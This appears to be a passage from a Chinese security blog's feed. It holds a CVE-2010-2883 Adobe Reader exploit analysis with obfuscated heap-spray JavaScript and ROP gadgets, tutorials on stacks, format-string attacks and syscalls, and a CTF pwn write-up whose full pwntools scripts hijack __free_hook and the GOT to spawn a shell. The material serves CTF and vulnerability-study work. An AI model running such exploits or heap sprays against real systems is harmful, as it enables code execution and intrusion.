SRrMvMAOXcbsiGKZawqPShWHOEnYUhlMdTQEhPNhZpeaKOjnYCrGkeTCftz( <span class="string">&quot;%&quot;</span> + <span class="string">&quot;u&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;%u&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> );</span><br><span class="line"><span class="keyword">while</span> (ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl+=ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl;</span><br><span class="line">xhqRDDrTFaPkhbN = ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span>-<span class="number">0x24</span>)/<span class="number">2</span>);</span><br><span class="line">xhqRDDrTFaPkhbN += gpEWSNKZtZtrDtXDBlCGqjwdCCvqvwmQdNdYQREWutshKgfOzkONtk;</span><br><span class="line">xhqRDDrTFaPkhbN += ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl;</span><br><span class="line">VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG = xhqRDDrTFaPkhbN.substring(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG.length &lt; <span class="number">0x80000</span>) VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG += VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG;</span><br><span class="line">mLVmRyYrugLJciVQSgzSkPkUFzjzDOKYXQkoytvknMtSifxjImzmzSTeiCuEQPphAUUaPPwqzvKauVkNtTGlsHqWo = VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span>-<span class="number">0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> TTVHhqJwkQBQtxBZnehysrCfheMgKLPScAahDQdBupbGZfetgTbtisRexcMEZXwfwmcwgapnfnVxiGFHJwuwBYqddyfeF = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (BtzHVK=<span class="number">0</span>;BtzHVK&lt;<span class="number">0x1f0</span>;BtzHVK++) TTVHhqJwkQBQtxBZnehysrCfheMgKLPScAahDQdBupbGZfetgTbtisRexcMEZXwfwmcwgapnfnVxiGFHJwuwBYqddyfeF[BtzHVK]=mLVmRyYrugLJciVQSgzSkPkUFzjzDOKYXQkoytvknMtSifxjImzmzSTeiCuEQPphAUUaPPwqzvKauVkNtTGlsHqWo+<span class="string">&quot;s&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>最后调用计算器</p>
<p><img src="https://s2.loli.net/2022/04/27/Bv6CuDKlznyjEqs.png" alt="WinExec"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>主要是构造了ROPchain。</p>
<p>使用到的Gadget主要有：</p>
<ul>
<li>0x4A82A714 &gt; <code>pop esp;ret</code></li>
<li>0x4A8063A5 &gt; <code>pop ecx;ret</code></li>
<li>0x4A802196 &gt; <code>mov dword ptr ds:[ecx],eax;ret</code></li>
<li>0x4A80CB38 &gt; <code>add ebp,794;leave;ret</code></li>
<li>0x4A801F90 &gt; <code>pop eax;ret</code></li>
<li>0x4A80B692 &gt; <code>jmp dword ptr ds:[eax]</code></li>
<li>0x4A842DB2 &gt; <code>xchg eax,edi;ret</code></li>
<li>0x4A801064 &gt; <code>ret</code></li>
<li>……</li>
</ul>
<p>再来看EXP可以很明显的看见其中的gadget</p>
<p><img src="https://s2.loli.net/2022/04/27/WhjETCo8p4i3NtB.png" alt="EXP"></p>
<p>利用这些gadget和嵌入文件的JS代码，将shellcode写入文件的可执行段(绕过DEP)，也就是我们调用 CreateFile 等函数的所申请的内存空间，最后执行。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.joe1sn.top/2020/10/06/%E5%88%9D%E5%AD%A6CVE-2010-2883%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E5%8F%8A%E5%A4%8D%E7%8E%B0/">初学CVE-2010-2883漏洞调试及复现</a></p>
<p><a href="https://www.anquanke.com/post/id/179681">细说CVE-2010-2883从原理分析到样本构造 </a></p>
<p>《软件战争 软件漏洞分析技术揭秘》 2.3 CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞</p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>CVE</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>栈介绍</title>
    <url>/2022/03/04/%E6%A0%88%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p>对于此数据结构，我们不过多讲述，仅以执行程序时内存中的运行时栈来简单讲讲。</p>
<span id="more"></span>

<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>栈是一种只允许在一端插入或删除的线性表，且允许插入和删除的一端称为栈顶，另一端称为栈底。</p>
<h3 id="运行时栈"><a href="#运行时栈" class="headerlink" title="运行时栈"></a>运行时栈</h3><p>在执行程序时，系统会为这个程序分配一块虚拟地址空间，这块空间中的一部分为该程序对应的<strong>运行时栈</strong>。当一个<code>x86-64</code>过程需要的存储空间超过了寄存器能够存放的大小时，或需要保存局部变量时，就会在栈上分配空间。这个部分称为<strong>过程</strong>的<strong>栈帧</strong>(Stack Frame)。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。具体见下图</p>
<p><img src="https://s2.loli.net/2022/03/05/HAdJVeYC9BiNcT2.png" alt="32位模式下内存经典布局"></p>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>后进先出(LIFO)：由于栈只允许在一端插入或删除，因此具有此特性，并称为LIFO(Last In First Out)。</p>
<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><h3 id="Push"><a href="#Push" class="headerlink" title="Push"></a>Push</h3><p>即入栈，插入新的元素作为栈顶。</p>
<h3 id="Pop"><a href="#Pop" class="headerlink" title="Pop"></a>Pop</h3><p>即出栈，取出栈顶元素。</p>
<p>在程序运行时栈中也是以入栈与出栈为基本操作。</p>
<h2 id="栈上的局部储存"><a href="#栈上的局部储存" class="headerlink" title="栈上的局部储存"></a>栈上的局部储存</h2><p>到目前为止，大部分过程都不会出现超过寄存器大小的本地存储区域了，不过有时，局部数据还是要存放在内存中，包括：寄存器不足而存放、一个变量的地址要存放、某些局部变量是数组或结构体只能存放在内存中。</p>
<p>而过程中产生的局部变量存储在栈帧中，过程的参数存储在该栈帧前。并且通过入栈顺序和数据大小能轻易计算出与栈帧的偏移，并通过<code>lea</code>指令与<code>rbp</code>寄存器中保存的栈帧地址来得到变量的地址，从而使用。(入栈顺序参考这篇<a href="http://www.rabb1t.xyz/2022/03/04/%E5%85%A5%E6%A0%88%E9%A1%BA%E5%BA%8F/">文章</a>)</p>
<h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p>在介绍函数调用栈之前，简单介绍一下过程。</p>
<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>前面提到在程序运行中，栈会有属于自己的一块空间，并且会分配<strong>过程的栈帧</strong>。实际上，软件中将封装代码的方式称为过程，过程用一组指定参数和一个可选的返回值实现了某种功能。因此我们能想到：函数、方法、处理函数等都是<strong>过程的形式</strong>。</p>
<p>而函数调用栈的过程，实际上对应了计算机提供给过程执行的支持：<strong>传递控制、传递数据、分配和释放内存</strong>。</p>
<h3 id="函数调用栈的过程"><a href="#函数调用栈的过程" class="headerlink" title="函数调用栈的过程"></a>函数调用栈的过程</h3><ol>
<li><p>先是<strong>传递数据</strong>，将此函数所使用到的参数依次入栈，然后得到数据与栈帧指针的偏移来利用数据。</p>
</li>
<li><p>再是<strong>转移控制</strong></p>
<ol>
<li>执行了<code>call</code>指令，进行两步操作：<ol>
<li>将当前<code>ip</code>或<code>cs和ip</code>压入栈中，即<code>push ip</code></li>
<li>转移，与<code>jmp</code>原理相同</li>
</ol>
</li>
</ol>
</li>
<li><p>接着执行函数<strong>分配内存</strong>：</p>
<ol>
<li>将<code>bp</code>压入栈，即<code>push bp</code></li>
<li>减小栈指针，即<code>sub sp,idata</code>，分配了足够大的栈帧空间</li>
</ol>
</li>
<li><p>函数终止，开始<strong>释放内存</strong>：</p>
<ol>
<li><p>执行<code>leave</code>指令，进行两步操作：</p>
<ol>
<li>释放栈空间，即<code>mov sp,bp</code></li>
<li>恢复栈帧，即<code>pop bp</code></li>
</ol>
</li>
<li><p>最后<strong>恢复控制</strong>，执行<code>ret</code>指令：</p>
<ul>
<li>修改<code>ip</code>内容为栈顶中的内容，即<code>pop ip</code></li>
</ul>
</li>
</ol>
</li>
</ol>
<p>至此算是一个函数调用的过程，由此可以看出<strong>过程能够递归的调用它们自身</strong>，并且每个过程都有属于自己的栈帧。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞小结</title>
    <url>/2022/03/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<p>记录自己对格式化字符串漏洞的理解。</p>
<span id="more"></span>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>格式化字符串漏洞是利用程序员对格式化字符串函数的错误使用导致的对栈上的内容造成了泄露或内存中地址内容的改写。</p>
<p>在利用格式化字符串漏洞前，我们需要对格式化字符串函数有个大概了解，<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/#_2">CTF Wiki</a>上写的很详细。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>格式化字符串漏洞的利用需要有程序执行格式化字符串函数的环节。</p>
<h3 id="基本利用"><a href="#基本利用" class="headerlink" title="基本利用"></a>基本利用</h3><h4 id="泄露栈上内容"><a href="#泄露栈上内容" class="headerlink" title="泄露栈上内容"></a>泄露栈上内容</h4><p>通过<code>%&#123;&#125;$p</code>来泄露栈上地址。</p>
<h4 id="改写地址内容"><a href="#改写地址内容" class="headerlink" title="改写地址内容"></a>改写地址内容</h4><p>通过<code>%&#123;&#125;$n</code>和向栈上写入任意地址来实现改写任意地址内容。并且’n’为覆盖4字节内容，’hn’为覆盖2字节内容，’hhn’为覆盖1字节内容。</p>
<p>需要注意的是，不同模式下的传参方式不同导致构造的payload中的格式化字符串的参数不同。32位模式下，参数都是在栈上保存的，没什么好说的；64位模式下，前6位参数保存在寄存器内，因此泄露或改写的地址一般从第7位开始计算。</p>
<p>使用<code>pwndbg</code>的<code>fmtarg</code>指令获得泄露该地址的格式化字符串，或手动计算偏移得到格式化字符串。</p>
<p>利用这两个基本操作外，我们根据栈溢出漏洞攻击的思路进行攻击，也有格式化字符串漏洞攻击的技巧。</p>
<h3 id="利用漏洞技巧"><a href="#利用漏洞技巧" class="headerlink" title="利用漏洞技巧"></a>利用漏洞技巧</h3><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>能利用格式化字符串漏洞泄露栈上内容，因此可以得到出现在栈上的libc函数的地址再计算offset泄露libc的基地址；当开启了随机化保护时，也可以找到栈上main函数的<code>push rbp</code>，即main函数的首地址来计算开栈的基地址以绕过。</p>
<h4 id="对地址块中间的内容进行修改"><a href="#对地址块中间的内容进行修改" class="headerlink" title="对地址块中间的内容进行修改"></a>对地址块中间的内容进行修改</h4><p>由于缓冲区大小的限制，导致我们不能覆盖内容为一个很大的数。因此，我们经常使用<code>hn</code>或<code>hhn</code>来进行改写内容，但由于64位模式下，一个地址块的大小为8字节，所以我们直接以该地址为任意写的地址，我们只能改到最多低2字节。但是我们如果给该地址加上一点偏移作为任意写的地址，就能对地址块中间的内容进行修改。举一个直观的例子：</p>
<p>假设栈上地址<code>0x00</code>的内存块的内容为<code>0xAABBCCDDEEFFGGHH</code></p>
<p>如果我们欲修改<code>0x00</code>地址的中间的<code>0xEE</code>内容的这一个字节。直接以<code>0x00</code>为地址，修改的就是最后的<code>0xHH</code>。所以我们要使用<code>0x03</code>为任意写地址，那么就能修改到中间的<code>0xEE</code>了。</p>
<p>需要注意的是，由于Linux是小端序的系统，所以<code>0x00</code>地址块的内容实际为<code>0xHHGGFFEEDDCCBBAA</code>因此，我们要修改的中间的<code>0xEE</code>的偏移是3，而不是4。</p>
<h4 id="栈上的partial-overwrite"><a href="#栈上的partial-overwrite" class="headerlink" title="栈上的partial overwrite"></a>栈上的partial overwrite</h4><p>栈上的partial overwrite除了利用栈溢出漏洞进行改写，也可以使用格式化字符串漏洞进行低位地址的修改，但是由于需要修改低12位地址，因此还需要泄露待改写函数的倒数第二字节的内容。</p>
<h4 id="利用栈上的链式结构进行任意地址改写"><a href="#利用栈上的链式结构进行任意地址改写" class="headerlink" title="利用栈上的链式结构进行任意地址改写"></a>利用栈上的链式结构进行任意地址改写</h4><p>常用于非栈上的格式化字符串漏洞，即我们写入的格式化字符串并不是在栈上，所以我们不能通过写入任意地址进行改写。</p>
<p>常利用<code>rbp</code>的链式结构(栈帧中的内容总是上一个栈帧或0)对任意地址进行改写。以当前栈帧(rbp中的地址)中存储的上一个栈帧的地址作为任意写的地址并对其中内容进行改写为我们需要修改的内容，再对上一个栈帧中的存储的地址作为任意写的地址并对其中内容进行改写。画一个更直观的图：</p>
<p><img src="https://s2.loli.net/2022/03/04/kXphy9uBxaMcjPg.png" alt="6"></p>
<p><em>暂时就这些，其他的等我想起了或者遇到新的技巧再补充。</em></p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>系统调用介绍</title>
    <url>/2022/03/04/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p>稍微介绍了一下Linux不同模式的系统调用。</p>
<span id="more"></span>

<h2 id="Linux下的系统调用"><a href="#Linux下的系统调用" class="headerlink" title="Linux下的系统调用"></a>Linux下的系统调用</h2><p>系统调用和普通库函数调用非常相似，只是系统调用由操作系统内核提供，运行于内核态，而普通的库函数调用由函数库或用户自己提供，运行于用户态。</p>
<p>系统不同模式下的系统调用的方式不同:</p>
<p>32位模式下，系统调用通过<code>int 0x80</code>执行中断类型码为128(0x80)的中断处理程序。<code>int</code>指令是汇编中的中断操作，而128对应的中断处理程序为：中断将指定程序传送给正在处理该中断的人，通过检查寄存器<code>eax</code>中的值，通知内核程序想要进行的系统调用，这个值称之为系统调用号。</p>
<p>64位模式下，系统调用通过<code>syscall</code>执行。<code>syscall</code>是由内核提供的用户空间与内核空间进行交互的一套标准API，这些API能够让用户受限的访问硬件设备。其运作原理与<code>int 0x80</code>类似，也是通过检测<code>rax</code>中的值来执行指定系统调用。</p>
<p>由于本人水平有限，不宜在此处多讲，免得误人子弟。但如果仅是为了做CTF中的题目，那么我们只需要知道不同模式下系统调用的方式即可。</p>
<h3 id="32"><a href="#32" class="headerlink" title="32"></a>32</h3><p>传参方式：系统调用的参数存储在<code>ebx</code>,<code>ecx</code>,<code>edx</code>中，返回值存在eax寄存器</p>
<p>系统调用号：将系统调用号存入eax</p>
<p>调用方式：使用<code>int 0x80</code>中断调用使系统进入内核态，执行系统调用</p>
<p>具体包括系统调用号可以看这篇<a href="https://blog.csdn.net/xiaominthere/article/details/17287965">文章</a>。</p>
<h3 id="64"><a href="#64" class="headerlink" title="64"></a>64</h3><p>传参方式：参数依次存入<code>rdi</code>，<code>rsi</code>，<code>rdx</code>寄存器中，返回值存在rax寄存器</p>
<p>系统调用号：系统调用号传入<code>rax</code></p>
<p>调用方式：使用<code>syscall</code>进行系统调用</p>
<p>若将系统调用号看作参数，实际上可以将64位的系统调用看作<code>syscall([rax],[rdi],[rsi],[rdx])</code></p>
<p>系统调用号可以看这篇<a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">文章</a>。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>covteamctf_pwn_wp</title>
    <url>/2022/07/07/covteamctf-pwn-wp/</url>
    <content><![CDATA[<!-- 审核赛捏 -->

<span id="more"></span>

<h2 id="EDGvsDKgame1"><a href="#EDGvsDKgame1" class="headerlink" title="EDGvsDKgame1"></a>EDGvsDKgame1</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>保护全开</p>
<p>note 类型的堆题，每个功能都有。</p>
<p>审出的漏洞有：</p>
<ul>
<li>create 时是以 num 为下标，而 delete 堆会使 num-- ，当我们一次释放掉多个 chunk，再 create 会覆盖掉未释放的 chunk。虽然没用上</li>
<li>delete 功能存在 uaf</li>
<li>edit 功能存在 off-by-null</li>
</ul>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>利用 off-by-null 漏洞和 edit 功能实现堆重叠</li>
<li>利用 uaf 漏洞和 show 功能泄露 libc 版本</li>
<li>利用 uaf 漏洞和 edit 功能修改 tcaches 进行 getshell</li>
</ol>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;ctf.joe1sn.top&#x27;</span>,<span class="number">28020</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">heap=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xa1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    edit(i,<span class="number">0x20</span>,payload)</span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">main_arena=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base=main_arena-<span class="number">0x3ebca0</span></span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">edit(<span class="number">13</span>,<span class="number">0x10</span>,p64(free_hook)+p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#6</span></span><br><span class="line">edit(<span class="number">6</span>,<span class="number">8</span>,p64(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">13</span>,<span class="number">8</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"><span class="comment"># print hex(free_hook)</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="FairPwn"><a href="#FairPwn" class="headerlink" title="FairPwn"></a>FairPwn</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>No PIE 与 Partial RELRO</p>
<p>程序申请两个 chunk 分别用来存储 name 和 message，message 的地址在 name chunk 的第5个地址块。</p>
<p>程序可以对 name 和 message 修改两次，并在第一次输入后输出一次内容，第二次输入后释放掉两个 chunk。</p>
<p>审出的漏洞有：</p>
<ul>
<li>使用栈上变量给堆变量赋值时，由于读入长度没有很好的检查，导致 strcpy 时会将 v4 与 src 一起复制给堆变量造成堆溢出</li>
</ul>
<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>利用堆溢出漏洞，将 name chunk 中的 message info 修改为 puts_got，待输出后泄露 libc 版本</li>
<li>利用堆溢出漏洞，将 free_got 修改为 system，free_got 位于 puts_got 后，待第二吃输出后 getshell</li>
</ol>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./pwn4&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;ctf.joe1sn.top&#x27;</span>,<span class="number">28061</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.23.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">ptr =<span class="number">0x00000000004040B0</span></span><br><span class="line">vuln=<span class="number">0x0000000000401376</span></span><br><span class="line"></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">payload=p64(puts_got)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">sla(<span class="string">&quot;Please enter your message: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Your Message:&quot;</span>)</span><br><span class="line">puts_addr=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2libc</span>(<span class="params">func,func_addr,flag=<span class="number">1</span>,one_gadget_addr=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        libc=ELF(libc_file)</span><br><span class="line">        <span class="comment"># libc=elf.libc</span></span><br><span class="line">        libc_base=func_addr-libc.sym[func]</span><br><span class="line">        sys_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">        environ=libc_base+libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">        __malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">        __free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">        libc=LibcSearcher(func,func_addr)</span><br><span class="line">        libc_base=func_addr-libc.dump(func)</span><br><span class="line">        sys_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">        environ=libc_base+libc.dump(<span class="string">&#x27;_environ&#x27;</span>)</span><br><span class="line">        __malloc_hook=libc_base+libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">        __free_hook=libc_base+libc.dump(<span 